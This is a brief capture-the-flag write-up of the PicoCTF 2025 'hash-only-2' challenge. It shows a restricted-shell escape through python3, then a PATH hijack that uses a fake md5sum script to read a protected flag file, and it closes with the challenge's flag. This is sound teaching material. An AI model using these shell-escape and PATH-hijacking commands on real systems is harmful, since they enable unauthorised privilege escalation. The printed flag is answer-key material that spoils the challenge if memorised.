# hash-only-2 - PicoCTF 2025 (Binary Exploitation)

## Introduction
On starting instance, we are given an ssh server to log into.

## Analysis
On logging in, we see that our shell is `rbash` which signals that it is a restricted bash shell. On trying to execute basic command we see that we are denied access.

Fortunately, `python3` command was allowed, which gave us a lot of control.

## Shell breaking
Using the `python3` command, any command could be executed which could be done using a regular bash terminal.

To spawn a bash shell which no restrictions, I used `python3 -c 'import pty;pty.spawn("/bin/bash")'`.

## Exploiting
Surprisingly, the `flaghasher` file was not in the directory. So to find it on the system, we use `find / -type f -iname "flaghasher" 2>/dev/null`.
This gave us the path of the file to be `/usr/local/bin/flaghasher`.

Since, no source code or binary was provided, it is assumed that this file is the exact same as in the previous challenge `hash-only-1`.

We created another version of md5sum which outputs the file it is used on and gave it executable permissions using echo `'#!/bin/bash' > md5sum; echo 'cat "$@"' >> md5sum; chmod +x md5sum`..
Using `pwd`, I get my current path as `/home/ctf-player`.
So, I add the path using `export PATH="/home/ctf-player:$PATH"`

On running the file now, we get the flag.

## Flag
picoCTF{Co-@utH0r_Of_Sy5tem_b!n@riEs_9bde33ed}
